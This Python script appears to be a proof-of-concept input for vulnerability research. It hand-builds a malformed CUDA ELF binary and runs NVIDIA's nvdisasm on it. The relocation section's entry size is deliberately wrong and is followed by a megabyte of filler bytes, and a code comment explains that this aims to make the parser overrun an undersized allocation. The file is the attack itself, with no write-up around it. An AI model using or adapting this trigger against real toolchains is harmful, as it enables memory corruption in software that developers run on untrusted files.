import os
import struct
import subprocess

WORK = "work"
ART = os.path.join(WORK, "artifact.cubin")
os.makedirs(WORK, exist_ok=True)

# ELF constants
ELFCLASS64 = 2
ELFDATA2LSB = 1
EV_CURRENT = 1
ET_EXEC = 2
EM_CUDA = 190
SHT_NULL = 0
SHT_PROGBITS = 1
SHT_SYMTAB = 2
SHT_STRTAB = 3
SHT_RELA = 4
SHF_ALLOC = 0x2
SHF_EXECINSTR = 0x4

# File layout
TEXT_OFF = 0x1000
TEXT_SIZE = 0x100

RELA_OFF = 0x2000
RELA_SIZE = 0x100000          # 1 MiB of section payload
RELA_ENTSIZE = 0x1000         # deliberately not sizeof(Elf64_Rela)

SYMTAB_OFF = 0x103000
SYMTAB_SIZE = 0x30
STRTAB_OFF = 0x104000
STRTAB_SIZE = 0x8
SHSTRTAB_OFF = 0x105000
SHOFF = 0x106000
SHNUM = 6

# Build .shstrtab
shstr = b""

def add_shstr(s):
    global shstr
    off = len(shstr)
    shstr += s + b"\0"
    return off

name_null = add_shstr(b"")
name_text = add_shstr(b".text")
name_rela = add_shstr(b".rela.text")
name_symtab = add_shstr(b".symtab")
name_strtab = add_shstr(b".strtab")
name_shstrtab = add_shstr(b".shstrtab")

# Build .strtab and .symtab
strtab = b"\0text\0"
symtab = bytearray(SYMTAB_SIZE)
# Entry 1: section symbol for .text
struct.pack_into("<IBBHQQ", symtab, 24, 1, 0x03, 0, 1, 0, TEXT_SIZE)

total = SHOFF + SHNUM * 64
buf = bytearray(total)

# ELF header
ident = bytearray(16)
ident[0:4] = b"\x7fELF"
ident[4] = ELFCLASS64
ident[5] = ELFDATA2LSB
ident[6] = EV_CURRENT

struct.pack_into(
    "<16sHHIQQQIHHHHHH",
    buf, 0,
    bytes(ident),
    ET_EXEC,
    EM_CUDA,
    EV_CURRENT,
    0,          # e_entry
    0,          # e_phoff
    SHOFF,      # e_shoff
    0,          # e_flags
    64,         # e_ehsize
    0,          # e_phentsize
    0,          # e_phnum
    64,         # e_shentsize
    SHNUM,      # e_shnum
    5,          # e_shstrndx
)

# Section payloads
buf[TEXT_OFF:TEXT_OFF + TEXT_SIZE] = b"\x00" * TEXT_SIZE
buf[RELA_OFF:RELA_OFF + RELA_SIZE] = b"\x41" * RELA_SIZE
buf[SYMTAB_OFF:SYMTAB_OFF + SYMTAB_SIZE] = symtab
buf[STRTAB_OFF:STRTAB_OFF + STRTAB_SIZE] = strtab
buf[SHSTRTAB_OFF:SHSTRTAB_OFF + len(shstr)] = shstr

def sh(i, name, typ, flags, addr, off, size, link, info, align, entsize):
    base = SHOFF + i * 64
    struct.pack_into(
        "<IIQQQQIIQQ",
        buf, base,
        name, typ, flags, addr, off, size, link, info, align, entsize
    )

# Section headers
sh(0, 0, SHT_NULL, 0, 0, 0, 0, 0, 0, 0, 0)
sh(1, name_text, SHT_PROGBITS, SHF_ALLOC | SHF_EXECINSTR,
   0, TEXT_OFF, TEXT_SIZE, 0, 0, 8, 0)

# Malformed SHT_RELA: sh_entsize is not sizeof(Elf64_Rela).
# The section handler may size an allocation from sh_size / sh_entsize
# but still consume sh_size bytes.
sh(2, name_rela, SHT_RELA, 0,
   0, RELA_OFF, RELA_SIZE, 3, 1, 8, RELA_ENTSIZE)

sh(3, name_symtab, SHT_SYMTAB, 0,
   0, SYMTAB_OFF, SYMTAB_SIZE, 4, 1, 8, 24)
sh(4, name_strtab, SHT_STRTAB, 0,
   0, STRTAB_OFF, STRTAB_SIZE, 0, 0, 1, 0)
sh(5, name_shstrtab, SHT_STRTAB, 0,
   0, SHSTRTAB_OFF, len(shstr), 0, 0, 1, 0)

with open(ART, "wb") as f:
    f.write(buf)

proc = subprocess.run(
    ["nvdisasm", ART],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL
)
print(f"EXIT={proc.returncode}")